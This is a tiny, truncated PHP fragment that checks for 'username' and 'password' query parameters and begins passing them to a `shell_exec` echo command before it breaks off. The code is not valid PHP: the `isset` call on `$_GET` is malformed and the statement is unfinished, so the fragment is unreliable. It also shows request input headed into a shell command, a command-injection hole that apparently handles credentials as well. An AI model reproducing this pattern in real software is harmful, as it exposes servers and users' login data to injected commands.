<?php

if( isset($_GET['username','password']) ){
	$payload = shell_exec("echo [uname:"
